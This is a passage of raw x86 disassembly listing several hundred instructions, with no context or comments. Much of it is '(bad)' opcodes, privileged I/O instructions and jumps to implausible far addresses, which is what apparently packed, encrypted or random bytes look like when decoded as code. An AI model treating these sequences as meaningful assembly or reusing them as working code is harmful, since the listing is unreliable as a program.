  415f45:	add    eax,0xd237244f
  415f4a:	jmp    0x566fe476
  415f4f:	rol    BYTE PTR [esi+0x21],cl
  415f52:	mov    dl,0x60
  415f54:	aad    0x9f
  415f56:	fbstp  TBYTE PTR ss:[eax+0x5d93591f]
  415f5d:	cmp    eax,0xee5a17bb
  415f62:	and    edi,DWORD PTR [ebp+0x72]
  415f65:	xchg   ebp,eax
  415f66:	clc    
  415f67:	push   0x1de8044c
  415f6c:	ret    0x7fcf
  415f6f:	retf   0xb895
  415f72:	call   0x846d358b
  415f77:	cli    
  415f78:	inc    ecx
  415f79:	pop    ecx
  415f7a:	aas    
  415f7b:	xor    esp,DWORD PTR [esi-0x10228bd2]
  415f81:	pop    esi
  415f82:	(bad)  
  415f83:	sti    
  415f84:	faddp  st(7),st
  415f86:	sub    bl,dl
  415f88:	int    0x38
  415f8a:	mov    bl,dh
  415f8c:	push   es
  415f8d:	pop    ebx
  415f8e:	jnp    0x415f5c
  415f90:	adc    BYTE PTR ds:0xa581e97f,bh
  415f96:	adc    al,0x5f
  415f98:	xchg   esp,eax
  415f99:	ret    0x84ee
  415f9c:	mov    ah,0xff
  415f9e:	jae    0x415f41
  415fa0:	adc    al,0x77
  415fa2:	inc    BYTE PTR [ebx]
  415fa4:	mov    BYTE PTR [ebp+ebx*2+0x3a],dh
  415fa8:	icebp  
  415fa9:	jnp    0x415f90
  415fab:	push   esp
  415fac:	inc    edi
  415fad:	mov    cl,0xe2
  415faf:	into   
  415fb0:	in     al,dx
  415fb1:	mov    esp,DWORD PTR [edx-0xce090c8]
  415fb7:	pop    ecx
  415fb8:	inc    ecx
  415fb9:	push   0x20
  415fbb:	adc    DWORD PTR [ecx+0x501863c5],edx
  415fc1:	mov    al,ds:0x903034df
  415fc6:	arpl   WORD PTR [eax],di
  415fc8:	dec    edx
  415fc9:	pop    esp
  415fca:	es addr16 push eax
  415fcd:	inc    edx
  415fce:	or     ecx,ebp
  415fd0:	aam    0x99
  415fd2:	and    DWORD PTR [esi+ecx*2-0x64251168],ebp
  415fd9:	add    al,0x38
  415fdb:	push   ss
  415fdc:	pop    ebp
  415fdd:	lds    edx,FWORD PTR [ecx-0x35c3864e]
  415fe3:	test   al,0x6f
  415fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fe6:	pusha  
  415fe7:	inc    edi
  415fe8:	pop    ds
  415fe9:	inc    ebp
  415fea:	mov    al,cl
  415fec:	push   eax
  415fed:	mov    bl,0x21
  415fef:	push   eax
  415ff0:	cmp    esp,DWORD PTR [ebx-0xf004e0c]
  415ff6:	in     al,dx
  415ff7:	cmp    eax,0x6a218385
  415ffc:	and    ebx,DWORD PTR [ebp+0x1]
  415fff:	xchg   ebp,eax
  416000:	dec    ebp
  416001:	sub    bl,bl
  416003:	mov    edx,0x67001eaa
  416008:	das    
  416009:	push   eax
  41600a:	sub    al,0x65
  41600c:	ja     0x416007
  41600e:	mov    edx,0xbb285df6
  416013:	lock cmp bl,bh
  416016:	adc    eax,0xb3c61b5b
  41601b:	dec    edx
  41601c:	cmp    dl,BYTE PTR [edx+eax*4+0x78]
  416020:	retf   0x4f56
  416023:	ja     0x41600b
  416025:	xor    eax,esi
  416027:	jo     0x415faa
  416029:	and    edi,DWORD PTR [edi]
  41602b:	in     eax,dx
  41602c:	mov    ebp,0xa39645bf
  416031:	icebp  
  416032:	jmp    0x41606f
  416034:	rcr    bl,1
  416036:	data16 sahf 
  416038:	push   0x2d1faa01
  41603d:	add    DWORD PTR [ecx-0x75],eax
  416040:	ins    BYTE PTR es:[edi],dx
  416041:	adc    BYTE PTR [ecx],dl
  416043:	idiv   DWORD PTR [ebp-0x697a4d14]
  416049:	mov    bl,0x9f
  41604b:	dec    esi
  41604c:	adc    BYTE PTR [eax+0x33],cl
  41604f:	pop    esi
  416050:	jg     0x416082
  416052:	mov    ecx,0x2d4d3baa
  416057:	in     al,dx
  416058:	into   
  416059:	or     BYTE PTR [esi],ah
  41605b:	push   edx
  41605c:	stc    
  41605d:	(bad)  
  41605e:	(bad)  
  41605f:	arpl   WORD PTR ds:0x2005da13,ax
  416065:	cld    
  416066:	sub    eax,0x6b1f22f1
  41606b:	sahf   
  41606c:	push   0x424077f7
  416071:	pop    edx
  416072:	into   
  416073:	gs and al,0xd9
  416076:	fnstenv es:[ecx+0x36dba39d]
  41607d:	fisttp DWORD PTR [esi]
  41607f:	sub    al,0x47
  416081:	or     bl,BYTE PTR [ebx+0x52]
  416084:	inc    ecx
  416085:	adc    BYTE PTR [edi-0x2e],ch
  416088:	test   al,cl
  41608a:	fisttp WORD PTR [eax+eiz*8-0x4949f2b5]
  416091:	jnp    0x416062
  416093:	inc    ecx
  416094:	jmp    0x4160ec
  416096:	(bad)  
  416098:	or     DWORD PTR [ecx-0x3b1e2914],ebx
  41609e:	sti    
  41609f:	in     al,0x21
  4160a1:	sbb    al,0xd2
  4160a3:	rcr    BYTE PTR ds:[edi-0x6f],cl
  4160a7:	gs mov bl,dh
  4160aa:	stc    
  4160ab:	fs jnp 0x416126
  4160ae:	mov    edx,0xbb4f2fa0
  4160b3:	mov    cl,0xf3
  4160b5:	stos   DWORD PTR es:[edi],eax
  4160b6:	adc    ecx,DWORD PTR [esi]
  4160b8:	mov    ah,ah
  4160ba:	loope  0x4160d2
  4160bc:	call   0x3800a17c
  4160c1:	data16 mov ch,0x3f
  4160c4:	mov    ah,0xb7
  4160c6:	xchg   ebp,eax
  4160c7:	lock sub cl,BYTE PTR [ebx-0x49563dd1]
  4160ce:	pusha  
  4160cf:	cmp    cl,al
  4160d1:	mov    ecx,0x2f339157
  4160d6:	xchg   DWORD PTR [eax-0x71904033],ecx
  4160dc:	pop    edx
  4160dd:	pop    ds
  4160de:	xlat   BYTE PTR ds:[ebx]
  4160df:	imul   esp,DWORD PTR [ecx+0x7b],0xa6422ebf
  4160e6:	adc    BYTE PTR [esi+0x562df9f7],ah
  4160ec:	and    BYTE PTR [eax+0xa],cl
  4160ef:	sbb    bl,ah
  4160f1:	outs   dx,BYTE PTR ds:[esi]
  4160f2:	ficom  DWORD PTR [esi+0x3c]
  4160f5:	ds mov esi,0xe308f968
  4160fb:	xor    eax,0xcd76400a
  416100:	or     DWORD PTR [edi+ecx*4],ebp
  416103:	sbb    al,0x7a
  416105:	and    eax,0x6af93a9f
  41610a:	lea    ebp,[edi+edx*2-0x7bcbc4fb]
  416111:	popf   
  416112:	xor    eax,0x19c7634d
  416117:	and    DWORD PTR [edx+0xc4d43f6],esp
  41611d:	inc    BYTE PTR [ecx+esi*8+0x5e7f0e0e]
  416124:	je     0x4160f7
  416126:	popa   
  416127:	xor    DWORD PTR [ebx-0xa99c288],edi
  41612d:	mov    eax,ds:0x1ac464a6
  416132:	push   es
  416133:	out    dx,al
  416134:	sahf   
  416135:	(bad)  
  416136:	popf   
  416137:	fistp  DWORD PTR [ebp+0x77b1c347]
  41613d:	sbb    DWORD PTR [ebp+0x5092ae0f],ebx
  416143:	je     0x4161ba
  416145:	mov    bl,0xda
  416147:	push   ebx
  416148:	lsl    ebp,WORD PTR [edi-0x8]
  41614c:	and    cl,al
  41614e:	test   DWORD PTR [ebx],ebp
  416150:	dec    edi
  416151:	jne    0x416197
  416153:	cwde   
  416154:	pop    edi
  416155:	rcl    DWORD PTR [ecx+0x3],cl
  416158:	mov    al,ds:0xe9881b13
  41615d:	mov    ds:0x38aad9f8,al
  416162:	mov    bh,0x7e
  416164:	pop    ds
  416165:	lods   al,BYTE PTR ds:[esi]
  416166:	dec    esp
  416167:	aaa    
  416168:	adc    eax,0x409571f5
  41616d:	shr    al,1
  41616f:	fsubr  QWORD PTR [ebp-0x17]
  416172:	adc    DWORD PTR [ebx+0x5d],esp
  416175:	mov    esp,0x6f7cfb98
  41617a:	pop    ebp
  41617b:	jmp    0x416181
  41617d:	pop    esp
  41617e:	icebp  
  41617f:	(bad)  
  416180:	inc    DWORD PTR [ebx]
  416182:	cmp    esi,DWORD PTR [edi+0x4d06090e]
  416188:	mov    WORD PTR [edx+0x70],?
  41618b:	iret   
  41618c:	lods   eax,DWORD PTR ds:[esi]
  41618d:	mov    dh,0x59
  41618f:	jmp    0xd09cf6ce
  416194:	es std 
  416196:	mov    ds:0xc25e7efa,al
  41619b:	fdiv   QWORD PTR [ebx+0x60]
  41619e:	mov    edx,0x88aca9e5
  4161a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161a4:	mov    al,0xf3
  4161a6:	push   eax
  4161a7:	mov    bl,0xf4
  4161a9:	shr    BYTE PTR [edi+0x6b],0xb1
  4161ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161ae:	sbb    esp,DWORD PTR [ebx+0x7a184d70]
  4161b4:	mov    ch,BYTE PTR [eax+0x59]
  4161b7:	or     BYTE PTR [ecx],bl
  4161b9:	mov    al,ds:0x99631c94
  4161be:	inc    esp
  4161bf:	cli    
  4161c0:	push   esi
  4161c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161c2:	sub    bl,0xd1
  4161c5:	xchg   esp,eax
  4161c6:	rcl    DWORD PTR ds:0xb8cf2c39,cl
  4161cc:	rcr    dl,cl
  4161ce:	cwde   
  4161cf:	in     al,dx
  4161d0:	pop    edi
  4161d1:	jno    0x416214
  4161d3:	in     al,dx
  4161d4:	retf   
  4161d5:	scas   eax,DWORD PTR es:[edi]
  4161d6:	push   eax
  4161d7:	cs jb  0x4161a2
  4161da:	stc    
  4161db:	adc    bh,bh
  4161dd:	add    esp,DWORD PTR [edi]
  4161df:	out    dx,al
  4161e0:	fdivr  QWORD PTR [edx]
  4161e2:	hlt    
  4161e3:	jecxz  0x416210
  4161e5:	imul   esi,DWORD PTR [ebp+0x748ef1f0],0xffffffc8
  4161ec:	pushf  
  4161ed:	shr    ecx,cl
  4161ef:	mov    eax,ds:0xa2efa003
  4161f4:	ds adc al,0x1b
  4161f7:	cmp    BYTE PTR [ebp+0x6df78e5d],0x65
  4161fe:	mov    eax,0xace8cdee
  416203:	mov    edx,0x164a25fc
  416208:	leave  
  416209:	add    eax,0xaccd5fb
  41620e:	shl    BYTE PTR [eax+0x1d837ac9],1
  416214:	mov    bh,0x75
  416216:	xor    ebp,ebp
  416218:	or     eax,DWORD PTR [ecx-0x5a]
  41621b:	(bad)  [edx]
  41621d:	mov    WORD PTR [esi+eiz*8],?
  416220:	cmp    al,0x12
  416222:	(bad)  
  416223:	dec    ecx
  416224:	xor    al,0x7e
  416226:	jmp    0x44bd309f
  41622b:	push   edx
  41622c:	cmp    ebx,ecx
  41622e:	popa   
  41622f:	cmp    BYTE PTR [edx+0x26b20b63],0xe3
  416236:	sbb    eax,0x306d66da
  41623b:	add    al,0xed
  41623d:	and    ch,dl
  41623f:	loopne 0x4161d1
  416241:	popa   
  416242:	jae    0x41628b
  416244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416245:	cmp    dl,BYTE PTR [ebx+eax*1]
  416248:	add    bh,BYTE PTR [edx-0x53029f9]
  41624e:	fwait
  41624f:	shl    bh,0x1a
  416252:	fisub  WORD PTR [ecx]
  416254:	mov    bh,0xb3
  416257:	pop    es
  416258:	fild   DWORD PTR es:[edi+0x37]
  41625c:	les    ebp,FWORD PTR [edx-0x63f6542]
  416262:	pop    es
  416263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416264:	imul   esi,esi,0x81a0281c
  41626a:	mov    bl,0x8c
  41626c:	retf   
  41626d:	(bad)  
  41626e:	in     al,dx
  41626f:	xchg   BYTE PTR [esi],bl
  416271:	scas   al,BYTE PTR es:[edi]
  416272:	out    dx,al
  416273:	out    dx,al
  416274:	jo     0x4162bb
  416276:	pop    ecx
  416277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416278:	jae    0x416264
  41627a:	pushf  
  41627b:	sbb    al,0x8d
  41627d:	cmp    cl,BYTE PTR [edi-0x4a8b86d4]
  416283:	scas   al,BYTE PTR es:[edi]
  416284:	cmp    al,0x9
  416286:	dec    edi
  416287:	jbe    0x4162cc
  416289:	jp     0x41622c
  41628b:	sub    eax,0x5a8a3886
  416290:	mov    edx,0x2ced277a
  416295:	aas    
  416296:	adc    eax,0xdb6716dc
  41629b:	push   esi
  41629c:	outs   dx,BYTE PTR ds:[esi]
  41629d:	cdq    
  41629e:	in     al,0x56
  4162a0:	jne    0x416278
  4162a2:	jmp    0x911a135f
  4162a7:	jge    0x4162e5
  4162a9:	and    eax,0xf5f15dc8
  4162ae:	out    dx,al
  4162af:	loope  0x416270
  4162b1:	mov    dh,0x42
  4162b3:	ret    
  4162b4:	adc    BYTE PTR [edx+esi*2+0x62e78452],bh
  4162bb:	popa   
  4162bc:	loop   0x416336
  4162be:	std    
  4162bf:	jg     0x4162d3
  4162c1:	or     DWORD PTR [esi],ebx
  4162c3:	fmul   st(0),st
  4162c5:	imul   esi,ebp,0x6c
  4162c8:	mov    ebp,DWORD PTR [eax-0x42]
  4162cb:	pushf  
  4162cc:	cmp    DWORD PTR [ebx],0xffffff89
  4162cf:	test   ebx,eax
  4162d1:	add    al,0x3f
  4162d3:	mov    al,0x23
  4162d5:	push   0x9e3eedb
  4162da:	adc    al,0x7c
  4162dc:	fldl2t 
  4162de:	clc    
  4162df:	inc    esp
  4162e0:	sbb    dl,BYTE PTR es:[ebx+0x4f]
  4162e4:	(bad)  
  4162e6:	push   edi
  4162e7:	xchg   edi,eax
  4162e8:	ret    0xd966
  4162eb:	jae    0x4162a8
  4162ed:	xor    eax,0x1f058c24
  4162f2:	cmp    eax,0x9867013e
  4162f7:	inc    edi
  4162f8:	test   DWORD PTR ds:0xf6c1d9c0,0x9c84b56
  416302:	mov    bh,0xf0
  416304:	pusha  
  416305:	gs xor al,0x80
  416308:	sub    al,0x0
  41630a:	cvttps2pi mm6,QWORD PTR [eax]
  41630d:	xchg   esi,eax
  41630e:	popa   
  41630f:	xor    al,0x45
  416311:	sbb    dh,BYTE PTR [ecx+eiz*4-0x6041d139]
  416318:	xchg   ebp,eax
  416319:	nop
  41631a:	xchg   esp,eax
  41631b:	jns    0x416320
  41631d:	loopne 0x4162ee
  41631f:	push   es
  416320:	mov    DWORD PTR [ecx],esp
  416322:	das    
  416323:	mov    bl,0x4c
  416325:	and    BYTE PTR [esi-0x63acf393],al
  41632b:	addr16 loopne 0x4162bd
  41632e:	lea    esi,[ecx-0x72208128]
  416334:	adc    BYTE PTR [edx+esi*4+0x7c],cl
  416338:	mov    ?,WORD PTR [ebp-0xa]
  41633b:	std    
  41633c:	mov    ds:0xee6bdb58,eax
  416341:	jmp    0x8382:0x237a53a9
  416348:	xchg   ebp,eax
  416349:	cli    
  41634a:	(bad)  
  41634b:	adc    eax,0x545909f7
  416350:	jne    0x41636e
  416352:	add    BYTE PTR [edi+0x1cf42f86],al
  416358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416359:	sbb    DWORD PTR [eax-0x19],eax
  41635c:	jmp    0x1e49:0x77bb6e34
  416363:	push   0x6a
  416365:	push   ds
  416366:	adc    eax,0x5c669174
  41636b:	repnz push ecx
  41636d:	mov    esp,0x5fbe0200
  416372:	xor    ebp,DWORD PTR [ecx]
  416374:	int3   
  416375:	and    al,0x8
  416377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416378:	retf   
  416379:	imul   ebx,DWORD PTR [eax-0x57e9a6c8],0xffffff92
  416380:	cmp    DWORD PTR [ebp+0x7887bf12],ecx
  416386:	xchg   esp,eax
  416387:	adc    bl,BYTE PTR [ecx-0x452cd1d9]
  41638d:	jnp    0x416379
  41638f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416390:	mov    ebx,0xe4a51a64
  416395:	cmp    bl,BYTE PTR [ecx+0x27]
  416398:	xchg   ebx,esi
  41639a:	sahf   
  41639b:	adc    bx,WORD PTR [edx]
  41639e:	mov    bl,0x42
  4163a0:	pop    ecx
  4163a1:	add    eax,0x1c86b013
  4163a6:	push   ss
  4163a7:	dec    esp
  4163a8:	xor    esi,DWORD PTR [edx+esi*2-0x447a3aa0]
  4163af:	add    edi,DWORD PTR [edx]
  4163b1:	push   esi
  4163b2:	sub    esp,DWORD PTR [edx+0x64887c2d]
  4163b8:	xchg   ecx,eax
  4163b9:	fistp  DWORD PTR [ebx]
  4163bb:	adc    bl,ch
  4163bd:	adc    al,0x6d
  4163bf:	mov    al,bh
  4163c1:	cdq    
  4163c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163c3:	outs   dx,BYTE PTR ds:[esi]
  4163c4:	scas   al,BYTE PTR es:[edi]
  4163c5:	xor    al,0x1c
  4163c7:	mov    esi,0x1493d803
  4163cc:	mov    eax,ds:0x877ac6f7
  4163d1:	mov    esi,0xf55da7ad
  4163d6:	imul   edx,DWORD PTR [edx-0x2b],0x56
  4163da:	aam    0x27
  4163dc:	adc    eax,0x48e3cc73
  4163e1:	scas   eax,DWORD PTR es:[edi]
  4163e2:	and    eax,0xd8129d2a
  4163e7:	pop    eax
  4163e8:	pop    esi
  4163e9:	lods   al,BYTE PTR ds:[esi]
  4163ea:	fsubr  DWORD PTR ds:0x7676177a
  4163f0:	fwait
  4163f1:	sbb    al,0xaa
  4163f3:	mov    esp,0x45fc7a5c
  4163f8:	ins    DWORD PTR es:[edi],dx
  4163f9:	or     edi,0xc455b442
  4163ff:	push   edx
  416400:	repz mov ebx,0xea860b75
  416406:	adc    ebp,DWORD PTR [edx]
  416408:	rcr    BYTE PTR ds:0xd901aad,0xda
  41640f:	repz and eax,0x70e3d41b
  416415:	inc    ebp
  416416:	data16 add BYTE PTR [ebp-0x74],dh
  41641a:	imul   esp,DWORD PTR [esp+esi*4-0x65ed64fb],0x3b
  416422:	in     eax,dx
  416423:	and    al,0x9c
  416425:	jge    0x416481
  416427:	add    DWORD PTR [edx-0x1e],ecx
  41642a:	xchg   bl,dl
  41642c:	cwde   
  41642d:	xchg   edi,eax
  41642e:	stos   BYTE PTR es:[edi],al
  41642f:	clc    
  416430:	jns    0x416423
  416432:	fdivr  DWORD PTR [esi-0x60]
  416435:	ret    0xc7b8
  416438:	repnz add cl,BYTE PTR [ecx]
  41643b:	daa    
  41643c:	ins    BYTE PTR es:[edi],dx
  41643d:	std    
  41643e:	dec    edi
  41643f:	es dec edi
  416441:	scas   eax,DWORD PTR es:[edi]
  416442:	scas   eax,DWORD PTR es:[edi]
  416443:	or     al,0x19
  416445:	xchg   esp,eax
  416446:	inc    esi
  416447:	jmp    0x416486
  416449:	jl     0x4164b5
  41644b:	fisub  DWORD PTR [eax]
  41644d:	imul   ebp,esp,0xffffffe3
  416450:	stos   DWORD PTR es:[edi],eax
  416451:	or     eax,0x724986ab
  416456:	(bad)  
  416457:	and    esp,DWORD PTR [edi]
  416459:	retf   0xddd3
  41645c:	rcr    DWORD PTR [esp+esi*4+0x47],1
  416460:	pop    eax
  416461:	cli    
  416462:	ficom  WORD PTR [ebx]
  416464:	test   al,0x2d
  416466:	jb     0x416420
  416468:	(bad)  
  416469:	imul   bh
  41646b:	stos   DWORD PTR es:[edi],eax
  41646c:	cmp    al,0x87
  41646e:	or     dh,bl
  416470:	cmp    DWORD PTR [esi-0x4dab70e],esi
  416476:	ror    BYTE PTR [ebp-0x5c],cl
  416479:	mov    DWORD PTR [esi-0x596f7a17],eax
  41647f:	dec    esi
  416480:	bound  esi,QWORD PTR [edx+edx*1+0x4f]
  416484:	push   ebx
  416485:	loope  0x416425
  416487:	clc    
  416488:	mov    bh,0x7e
  41648b:	jo     0x416461
  41648d:	js     0x416430
  41648f:	xchg   ecx,eax
  416490:	fisub  WORD PTR [eax]
  416492:	xchg   esp,eax
  416493:	idiv   esi
  416495:	mov    BYTE PTR [eax],bh
  416497:	repnz add eax,0xc72c16d8
  41649d:	or     ah,BYTE PTR [esi]
  41649f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164a0:	and    BYTE PTR [esi-0xa],dl
  4164a3:	pushf  
  4164a4:	lods   eax,DWORD PTR ds:[esi]
  4164a5:	push   edi
  4164a6:	adc    DWORD PTR [ebp-0x6f80c951],ecx
  4164ac:	lock ds call 0x84b:0x8588a491
  4164b5:	inc    cl
  4164b7:	sbb    eax,0xe45ae8d3
  4164bc:	add    eax,0x88e22f2c
  4164c1:	neg    DWORD PTR [edx]
  4164c3:	pop    esi
  4164c4:	xchg   edi,eax
  4164c5:	or     cl,bh
  4164c7:	ds arpl dx,sp
  4164ca:	out    dx,eax
  4164cb:	stos   DWORD PTR es:[edi],eax
  4164cc:	jp     0x416490
  4164ce:	xchg   esi,eax
  4164cf:	popf   
  4164d0:	push   es
  4164d1:	dec    eax
  4164d2:	nop
  4164d3:	jg     0x4164c8
  4164d5:	xchg   BYTE PTR [ebx-0xbe1ed67],bh
  4164db:	cli    
  4164dc:	(bad)  
  4164dd:	sti    
  4164de:	mov    bl,0xac
  4164e0:	pop    es
  4164e1:	push   cs
  4164e2:	mov    ch,0x7d
  4164e4:	call   0xccea:0x75c02184
  4164eb:	cmp    edi,DWORD PTR [esi+0x48dafdf]
  4164f1:	jb     0x416551
  4164f3:	sbb    al,BYTE PTR [esp+edx*2]
  4164f6:	retf   
  4164f7:	test   DWORD PTR [esp+ebp*2-0x51],0x4b8c62b8
  4164ff:	out    0xe2,al
  416501:	cdq    
  416502:	pop    edi
  416503:	mov    bh,BYTE PTR [eax+0x4f9fdb79]
  416509:	add    BYTE PTR [eax],ch
  41650b:	dec    ebp
  41650c:	ror    al,1
  41650e:	sahf   
  41650f:	jnp    0x4164de
  416511:	fimul  WORD PTR [esp+edx*2+0x49bb98bf]
  416518:	push   es
  416519:	adc    edx,DWORD PTR [edi]
  41651b:	fcomp  DWORD PTR [esi+0xc]
  41651e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41651f:	mov    edi,0x585c5839
  416524:	push   es
  416525:	adc    BYTE PTR [ebx+0x48],bh
  416528:	add    dh,BYTE PTR [esi]
  41652a:	mov    esi,0xa12cb70b
  41652f:	lock sbb esi,DWORD PTR ds:[edi]
  416533:	push   0xe737c875
  416538:	loopne 0x4164fa
  41653a:	adc    al,0x44
  41653c:	cs jns 0x41656c
  41653f:	sub    DWORD PTR [ebp-0x3],edi
  416542:	(bad)  
  416543:	push   ebp
  416544:	sub    eax,0xb55d546c
  416549:	test   DWORD PTR [eax-0x3],ecx
  41654c:	jmp    0xb0abdb9a
  416551:	daa    
  416552:	ja     0x4164fb
  416554:	jge    0x4164f2
  416556:	jecxz  0x41656a
  416558:	shl    DWORD PTR [ebx],1
  41655a:	sti    
  41655b:	lods   al,BYTE PTR ds:[esi]
  41655c:	mov    ds:0xdd1175e8,eax
  416561:	cmp    eax,0x62493960
  416566:	adc    BYTE PTR [ebx],ah
  416568:	push   esp
  416569:	dec    ebx
  41656a:	fbstp  TBYTE PTR [esi]
  41656c:	(bad)  [ebp+0x5a0867dd]
  416572:	aaa    
  416573:	add    al,0x14
  416575:	cmp    dh,BYTE PTR [eax+ebp*4-0x6c5efd01]
  41657c:	repz cmp BYTE PTR [edx-0x3e87e0f1],ch
  416583:	inc    esi
  416584:	loopne 0x416517
  416586:	dec    edi
  416587:	call   FWORD PTR ds:0x3b6f0f51
  41658d:	mov    al,ds:0x3e696fc3
  416592:	aam    0x51
  416594:	cmp    BYTE PTR [ebx-0x52c11a24],dh
  41659a:	and    DWORD PTR [ebx],0xab3f49f3
  4165a0:	test   al,0x2b
  4165a2:	repnz das 
  4165a4:	retf   0x3e28
  4165a7:	or     BYTE PTR [ebp-0x1c],ah
  4165aa:	jnp    0x4165f0
  4165ac:	adc    eax,edi
  4165ae:	(bad)  
  4165af:	aas    
  4165b0:	scas   al,BYTE PTR es:[edi]
  4165b1:	jns    0x4165d5
  4165b3:	scas   eax,DWORD PTR es:[edi]
  4165b4:	loope  0x4165af
  4165b6:	gs push cs
  4165b8:	ret    
  4165b9:	xchg   BYTE PTR [ecx],al
  4165bb:	jp     0x41658a
  4165bd:	push   es
  4165be:	out    dx,eax
  4165bf:	or     al,0xbc
  4165c1:	retf   0x1d1c
  4165c4:	cdq    
  4165c5:	inc    ecx
  4165c6:	adc    eax,0x46d3d349
  4165cb:	lods   al,BYTE PTR ds:[esi]
  4165cc:	and    eax,0xb1e5a83c
  4165d1:	shr    DWORD PTR [eax],1
  4165d3:	and    DWORD PTR [eax+0x6ce93572],eax
  4165d9:	arpl   WORD PTR [ebp-0x3769e2c0],ax
  4165df:	hlt    
  4165e0:	retf   0x9672
  4165e3:	repz sub BYTE PTR [eax],ah
  4165e6:	addr16 adc al,0xe7
  4165e9:	pop    edi
  4165ea:	add    ch,0x6
  4165ed:	and    al,0xbe
  4165ef:	pop    ds
  4165f0:	cmp    eax,edx
  4165f2:	adc    al,BYTE PTR [esp+edi*4+0x2a03f717]
  4165f9:	fisub  DWORD PTR [ebp-0x795c8d7c]
  4165ff:	scas   al,BYTE PTR es:[edi]
  416600:	aas    
  416601:	push   cs
  416602:	push   esp
  416603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416604:	xchg   esp,eax
  416605:	loop   0x41666c
  416607:	xor    eax,0x2b4e04e9
  41660c:	pop    eax
  41660d:	sub    BYTE PTR [ecx-0x2490e34d],0x30
  416614:	je     0x4165ad
  416616:	das    
  416617:	fs mov ch,0xf7
  41661a:	cwde   
  41661b:	jp     0x41661f
  41661d:	or     dl,al
  41661f:	mov    ebp,0x339cc33c
  416624:	pop    ebx
  416625:	add    BYTE PTR [eax+0x175a323a],0x21
  41662c:	jmp    0xd74:0xb4480eea
  416633:	mov    bl,0x58
  416635:	jo     0x4165e5
  416637:	xor    DWORD PTR [edx],eax
  416639:	lock push ecx
  41663b:	xchg   edx,eax
  41663c:	inc    ecx
  41663d:	xchg   ecx,eax
  41663e:	out    0xb,eax
  416640:	mov    ds:0xfd0b9ab5,eax
  416645:	sbb    esp,ebp
  416647:	push   0x133000ba
  41664c:	xor    dh,ch
  41664e:	push   edi
  41664f:	fwait
  416650:	daa    
  416651:	aam    0x2e
  416653:	lock sub al,0x55
  416656:	pop    esp
  416657:	pop    DWORD PTR [edx+0x15]
  41665a:	sbb    eax,0xf7d9c94b
  41665f:	add    ch,BYTE PTR [ebx-0x6a8012e1]
  416665:	repz int3 
  416667:	inc    esp
  416668:	fadd   QWORD PTR [edx+0x14]
  41666b:	pop    edx
  41666c:	add    ah,BYTE PTR [eax+0x5c44c449]
  416672:	adc    eax,DWORD PTR [edi]
  416674:	ins    DWORD PTR es:[edi],dx
  416675:	(bad)  
  416676:	retf   
  416677:	xor    eax,0x72cbb344
  41667c:	test   al,0xb9
  41667e:	out    dx,eax
  41667f:	cmp    BYTE PTR ss:[edi-0x31],0xc5
  416684:	inc    ebp
  416685:	sti    
  416686:	add    al,0xb1
  416688:	jbe    0x4166f1
  41668a:	push   cs
  41668b:	ret    0x1cc8
  41668e:	mov    dl,0x4f
  416690:	iret   
  416691:	inc    esp
  416692:	mov    ebp,0x325b7dd2
  416697:	pop    edi
  416698:	cwde   
  416699:	xor    eax,0xe3844bc3
  41669e:	jg     0x416640
  4166a0:	xor    al,0xd9
  4166a2:	loope  0x416705
  4166a4:	data16 loopne 0x416666
  4166a7:	jp     0x416712
  4166a9:	jmp    FWORD PTR [edi+0x49]
  4166ac:	pop    es
  4166ad:	je     0x416701
  4166af:	mov    bl,0xfe
  4166b1:	sti    
  4166b2:	int    0x30
  4166b4:	xchg   BYTE PTR [edx+esi*4-0x29],bh
  4166b8:	into   
  4166b9:	jmp    0xf726:0x2fd2ac16
  4166c0:	cmp    BYTE PTR [eax-0x19b48720],ah
  4166c6:	in     al,dx
  4166c7:	fs push edx
  4166c9:	sar    BYTE PTR [ecx+0x7e],1
  4166cc:	inc    ebx
  4166cd:	shr    DWORD PTR [esi-0x7a3ba018],0xb8
  4166d4:	jg     0x416724
  4166d6:	lock cmp ch,BYTE PTR [edi+0x75]
  4166da:	sar    DWORD PTR ds:0x2ca6d975,0x16
  4166e1:	int    0xaa
  4166e3:	call   0xc062af4e
  4166e8:	(bad)  
  4166eb:	je     0x4166de
  4166ed:	sbb    ecx,esi
  4166ef:	fnstcw WORD PTR [eax]
  4166f1:	sbb    al,0xdd
  4166f3:	aam    0x93
  4166f5:	xor    BYTE PTR [ebx+edx*1+0x1f021d17],dh
  4166fc:	xor    DWORD PTR [edx-0x12],ebp
  4166ff:	cli    
  416700:	pop    ss
  416701:	and    DWORD PTR [eax],ebp
  416703:	popf   
  416704:	mov    esi,eax
  416706:	(bad)  
  416708:	pusha  
  416709:	(bad)  
  41670a:	pop    edx
  41670b:	or     BYTE PTR [ecx+0x4],ch
  41670e:	fsubr  QWORD PTR [eax+0x2c51c166]
  416714:	xor    eax,DWORD PTR [edi]
  416716:	add    eax,0xdcb2e166
  41671b:	out    dx,eax
  41671c:	sub    esp,esp
  41671e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41671f:	push   ebp
  416720:	pushw  cs
  416722:	shr    BYTE PTR [edx+edi*2+0x5fd097d9],cl
  416729:	scas   eax,DWORD PTR es:[edi]
  41672a:	xchg   ecx,eax
  41672b:	mov    ebx,0xae02c2bc
  416730:	fsub   QWORD PTR [edi-0x17]
  416733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416734:	mov    al,ds:0x26eade4d
  416739:	xor    eax,0xa3dd95a9
  41673e:	or     al,0xb7
  416740:	jp     0x416747
  416742:	push   cs
  416743:	xchg   esi,eax
  416744:	aad    0xca
  416746:	xor    DWORD PTR ds:0x866f1e0d,esi
  41674c:	jmp    0x4167bf
  41674e:	mov    ebp,0xf7903111
